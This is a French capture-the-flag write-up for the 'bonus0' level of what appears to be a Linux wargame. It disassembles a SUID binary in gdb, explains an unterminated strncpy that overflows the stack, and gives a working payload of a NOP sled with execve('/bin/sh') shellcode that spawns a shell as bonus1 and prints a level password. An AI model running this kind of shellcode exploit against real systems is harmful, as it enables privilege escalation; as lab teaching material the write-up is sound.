## Analyse

- `ls -la`
  ```
  [...]
    -rwsr-s---+ 1 bonus1 users  5566 Mar  6  2016 bonus0
  [...]
  ```
    - On a un binaire appartenant a bonus1 dans le home avec les droits SUID.

- `./bonus0`
  ```
   -
  
  ```
  - Sans arguments, le programme affiche " - " et attend un input
    - `testa`
      ```
      testa
       -

      ```
      - Attend un second input
      - `testb`
        ```
        testb
         -
        testa testb
        ```
        - Affiche les inputs

- Avec des inputs trop longs, le programme SegFault:
  ```
   -
  AAAAAAAAAAAAAAAAAAAAAAAAA
   -
  BBBBBBBBBBBBBBBBBBBB
  AAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBB�� BBBBBBBBBBBBBBBBBBBB��
  Segmentation fault (core dumped)
  ```

- `gdb bonus0`
  - `set disassembly-flavor intel`
  - `info function`
    ```asm
    [...]
      0x080484b4  p
      0x0804851e  pp
      0x080485a4  main
    [...]
    ```
    - On trouve deux fonctions en plus du main: p() et pp()

  - `disas main`
    ```asm
    Dump of assembler code for function main:
       0x080485a4 <+0>:	push   ebp
       0x080485a5 <+1>:	mov    ebp,esp
       0x080485a7 <+3>:	and    esp,0xfffffff0
       0x080485aa <+6>:	sub    esp,0x40
       0x080485ad <+9>:	lea    eax,[esp+0x16]
       0x080485b1 <+13>:	mov    DWORD PTR [esp],eax
       0x080485b4 <+16>:	call   0x804851e <pp>
       0x080485b9 <+21>:	lea    eax,[esp+0x16]
       0x080485bd <+25>:	mov    DWORD PTR [esp],eax
       0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
       0x080485c5 <+33>:	mov    eax,0x0
       0x080485ca <+38>:	leave
       0x080485cb <+39>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+6>
      - Initialisation de le mémoire, libère 64 octets pour la stack et aligne la mémoire<br/><br/>
    - <+9> ... <+16>
      - Fait pointer eax sur esp + 22
      - Place eax (le pointeur sur esp+22) sur la stack (à esp)
      - Call pp() avec l'argument placé sur la stack (eax = pp(buffer))<br/><br/>
    - <+21> ... <+28>
      - Fait pointer eax sur esp + 22 (notre buffer)
      - Place eax (le pointeur sur esp +22) sur la stack (à esp)
      - Call puts() avec l'argument placé sur la stack (eax = puts(buffer))<br/><br/>
    - <+33> ... <+39>
      - Return eax (le retour du puts())
      - Réinitialisation de la mémoire, fin d'exécution<br/><br/>
   
  - `disas pp`
    ```asm
    Dump of assembler code for function pp:
       0x0804851e <+0>:	push   ebp
       0x0804851f <+1>:	mov    ebp,esp
       0x08048521 <+3>:	push   edi
       0x08048522 <+4>:	push   ebx
       0x08048523 <+5>:	sub    esp,0x50
       0x08048526 <+8>:	mov    DWORD PTR [esp+0x4],0x80486a0
       0x0804852e <+16>:	lea    eax,[ebp-0x30]
       0x08048531 <+19>:	mov    DWORD PTR [esp],eax
       0x08048534 <+22>:	call   0x80484b4 <p>
       0x08048539 <+27>:	mov    DWORD PTR [esp+0x4],0x80486a0
       0x08048541 <+35>:	lea    eax,[ebp-0x1c]
       0x08048544 <+38>:	mov    DWORD PTR [esp],eax
       0x08048547 <+41>:	call   0x80484b4 <p>
       0x0804854c <+46>:	lea    eax,[ebp-0x30]
       0x0804854f <+49>:	mov    DWORD PTR [esp+0x4],eax
       0x08048553 <+53>:	mov    eax,DWORD PTR [ebp+0x8]
       0x08048556 <+56>:	mov    DWORD PTR [esp],eax
       0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
       0x0804855e <+64>:	mov    ebx,0x80486a4
       0x08048563 <+69>:	mov    eax,DWORD PTR [ebp+0x8]
       0x08048566 <+72>:	mov    DWORD PTR [ebp-0x3c],0xffffffff
       0x0804856d <+79>:	mov    edx,eax
       0x0804856f <+81>:	mov    eax,0x0
       0x08048574 <+86>:	mov    ecx,DWORD PTR [ebp-0x3c]
       0x08048577 <+89>:	mov    edi,edx
       0x08048579 <+91>:	repnz scas al,BYTE PTR es:[edi]
       0x0804857b <+93>:	mov    eax,ecx
       0x0804857d <+95>:	not    eax
       0x0804857f <+97>:	sub    eax,0x1
       0x08048582 <+100>:	add    eax,DWORD PTR [ebp+0x8]
       0x08048585 <+103>:	movzx  edx,WORD PTR [ebx]
       0x08048588 <+106>:	mov    WORD PTR [eax],dx
       0x0804858b <+109>:	lea    eax,[ebp-0x1c]
       0x0804858e <+112>:	mov    DWORD PTR [esp+0x4],eax
       0x08048592 <+116>:	mov    eax,DWORD PTR [ebp+0x8]
       0x08048595 <+119>:	mov    DWORD PTR [esp],eax
       0x08048598 <+122>:	call   0x8048390 <strcat@plt>
       0x0804859d <+127>:	add    esp,0x50
       0x080485a0 <+130>:	pop    ebx
       0x080485a1 <+131>:	pop    edi
       0x080485a2 <+132>:	pop    ebp
       0x080485a3 <+133>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+5>
      - Initialisation de la mémoire, libère 80 octets pour la stack<br/><br/>
    - <+8> ... <+22>
      - Stocke la valeur à 0x80486a0 sur la stack (à esp + 4)
        - `x/s 0x80486a0`
          ```
          0x80486a0:	 " - "
          ```
      - Fait pointer eax sur ebp - 48
      - Place eax (&ebp - 48) sur la stack (à esp)
      - Call p() avec les arguments placés sur la stack (p(a_buffer, " - "))<br/><br/>
    - <+27> ... <+41>
      - Stocke la valeur à 0x80486a0 (" - ") sur la stack (à esp + 4)
      - Fait pointer eax sur ebp - 28
      - Place eax (&ebp - 28) sur la stack (à esp)
      - Call p() avec les arguments placés sur la stack (p(b_buffer, " - "))<br/><br/>
    - <+46> ... <+59>
      - Fait pointer eax sur ebp - 48 (a_buffer)
      - Stocke eax (a_buffer) sur la stack à esp + 4
      - Stocke ebp + 8 (&argv, notre buffer alloué dans le main) dans eax
      - Stocke eax (main_buffer) sur la stack (à esp)
      - Call strcpy() avec les arguments placés sur la stack (eax = strcpy(main_buffer, a_buffer))<br/><br/>
    - <+64> ... <+91>
      - Stocke la valeur à 0x80486a4 dans ebx
        - `x/s 0x80486a4`
          ```
          0x80486a4:	 " "
          ```
      - Stocke ebp + 8 dans eax (&argv)
      - Stocke 0xffffffff (-1) dans ebp - 60
      - Stocke eax (&argv, main_buffer) dans edx
      - Stocke 0x0 (0) dans eax
      - Stocke ebp - 60 (-1) dans ecx
      - Stock edx (main_buffer) dans edi
      - Call strlen() sur edi (cf. level8) (ecx = strlen(main_buffer))<br/><br/>
    - <+93> ... <+106>
      - Stocke ecx (résultat du strlen) dans eax
      - Bitwise not sur eax
      - Enlève 1 à eax (probablement pour le char de fin de string)
      - Add ebp + 8 (main_buffer) à eax (eax = buffer[len(buffer)]
      - Stocke ebx (" ") dans edx et remplit le reste de 0 (edx = " 0000...")
      - Socke dx (les 12 derniers octets de edx) a la valeur de l'adresse de eax (buffer + len(buffer) = "  ")<br/><br/>
    - <+109> ... <+122>
      - Fait pointer eax sur ebp - 28 (b_buffer)
      - Place eax (b_buffer) sur la stack (à esp + 4)
      - Stocke ebp + 8 (main_buffer) dans eax
      - Place eax sur la stack (à esp)
      - Call strcat() avec les arguments placés sur la stack (eax = strcat(main_buffer, b_buffer))<br/><br/>
    - <+127> ... <+133>
      - Return eax (le retour du strcat)
      - Réinitialisation de la mémoire, fin d'exécution.<br/><br/>
  - `disas p`
    ```asm
    Dump of assembler code for function p:
       0x080484b4 <+0>:	push   ebp
       0x080484b5 <+1>:	mov    ebp,esp
       0x080484b7 <+3>:	sub    esp,0x1018
       0x080484bd <+9>:	mov    eax,DWORD PTR [ebp+0xc]
       0x080484c0 <+12>:	mov    DWORD PTR [esp],eax
       0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
       0x080484c8 <+20>:	mov    DWORD PTR [esp+0x8],0x1000
       0x080484d0 <+28>:	lea    eax,[ebp-0x1008]
       0x080484d6 <+34>:	mov    DWORD PTR [esp+0x4],eax
       0x080484da <+38>:	mov    DWORD PTR [esp],0x0
       0x080484e1 <+45>:	call   0x8048380 <read@plt>
       0x080484e6 <+50>:	mov    DWORD PTR [esp+0x4],0xa
       0x080484ee <+58>:	lea    eax,[ebp-0x1008]
       0x080484f4 <+64>:	mov    DWORD PTR [esp],eax
       0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
       0x080484fc <+72>:	mov    BYTE PTR [eax],0x0
       0x080484ff <+75>:	lea    eax,[ebp-0x1008]
       0x08048505 <+81>:	mov    DWORD PTR [esp+0x8],0x14
       0x0804850d <+89>:	mov    DWORD PTR [esp+0x4],eax
       0x08048511 <+93>:	mov    eax,DWORD PTR [ebp+0x8]
       0x08048514 <+96>:	mov    DWORD PTR [esp],eax
       0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
       0x0804851c <+104>:	leave
       0x0804851d <+105>:	ret
    End of assembler dump.
    ```
    - <+0> ... <+3>
      - Initialisation de la mémoire, libère 4120 octets pour la stack<br/><br/>
    - <+9> ... <+15>
      - Stocke ebp + 12 (&argv1) dans eax
      - Place eax (&argv1) sur la stack
      - Call puts() avec l'argument placé sur la stack (eax = puts(" - "))<br/><br/>
    - <+20> ... <+45>
      - Place 0x1000 (4096) sur la stack (à esp + 8)
      - Fait pointer eax sur ebp - 4104 (esp + 16)
      - Place eax sur la stack (à esp + 4)
      - Place 0x0 (0) sur la staxk (à esp)
      - Call read() avec les arguments placés sur la stack (eax = read(0, p_buffer))<br/><br/>
    - <+50> ... <+67>
      - Place 0xa (10) sur la stack (à esp + 4)
      - Fait pointer eax sur ebp - 4104 (p_buffer)
      - Place eax sur la stack (à esp)
      - Call strchr() avec les arguments placés sur la stack (eax = strchr(p_buffer, 10))<br/><br/>
    - <+72> ... <+99>
      - Stocke 0x0 (0) dans eax
      - Fait pointer eax sur ebp - 4104 (p_buffer)
      - Place 0x14 (20) sur la stack (à esp + 8)
      - Place eax (0) sur la stack (à esp + 4)
      - Stocke ebp + 8 (&argv) dans eax
      - Place eax sur la stack (à esp)
      - Call stncpy() avec les arguments placés sur la stack (eax = strncpy(argv[0], stdin, 20))<br/><br/>
    - <+104> ... <+105>
      - Return eax (le return du strncpy)
      - Réinitialisation de la mémoire, fin d'exécution<br/><br/>
## Exploit

Toujours pas de call à "/bin/sh", on va encore avoir besoin d'un shellcode.
On a vu lors de l'analyse que notre programme print(" - "), prend un input sur stdin puis effectue un strncpy de 20 octets. Même logique pour le second input, puis il va copier les deux dans le buffer du main qui fait 42 octets. 

Étant donné que le strncpy de p() n'est pas protégé, il n'écrira pas de catactère de fin de string si l'input est trop long. Puisqu'on strcpy() ensuite dans pp() sans '\0', on va continuer d'écrire et overflow.

Cherchons l'offset:
- `gdb bonus0`
  - `set disassembly-flavor intel`
  - `r`
    ```
     - 
    
    ```
    - `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`
      ```
       - 
      ```
      - `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag`
        ```
        [...]
          Program received signal SIGSEGV, Segmentation fault.
            0x41336141 in ?? ()
        [...]
        ```
        - On réécrit l'EIP avec le second buffer et le générateur de pattern nous indique un offset de 9 pour la valeur 0x41336141.

L'objectif ici sera donc d'entrer notre shellcode dans le premier argument, et de réécrire l'EIP avec l'adresse de notre shellcode grâce au second input.
Pour cela on cherche l'adresse de notre premier buffer avant le read, donc on pose un breakpoint à <p +34>:

  - `b * p+34`
  - `r`
    ```
     -

    Breakpoint 1, 0x080484d6 in p ()
    ```
    - `x $ebp-0x1008`
      ```
      0xbfffe650:	0x00000000
      ```
      - l'adresse de notre premier buffer est donc 0xbfffe650

On va donc construire notre payload comme suit:
- 1er argument:
  - Suffisamment de NoOp (NOP sled) pour pouvoir tomber sur notre shellcode
  - [Notre shellcode](https://www.exploit-db.com/exploits/42428)
- 2eme argument:
  - "A" * 9
  - Notre adresse en little endian (4 octets)
  - "A" * 7

- `(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40> \xcd\x80"'; python -c 'print "A" * 9 + "\x50\xe6\xff\xbf" + "A" * 7'; cat) | ./bonus0`
  ```
   -
   -
  �����������������������������P������������ ���������P������������
  
  ```
  - `whoami`
    ```
    Segmentation fault (core dumped)
    ```
Ok ça ne fonctionne pas, c'est probablement que le début du premier buffer a été réécrit, on va essayer avec une adresse un peu plus loin (peu importe tant qu'on tombe sur nos NoOp): 0xbfffe650 => 0xbfffe6ff
- `(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40> \xcd\x80"'; python -c 'print "A" * 9 + "\xff\xe6\xff\xbf" + "A" * 7'; cat) | ./bonus0`
  ```
   -
   -
  ��������������������AAAAAAAAA����AAAAAAA�� AAAAAAAAA����AAAAAAA��
  ```
  - `whoami`
    ```
    bonus1
    ```
  - `cat /home/user/bonus1/.pass`
    ```
    cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
    ```
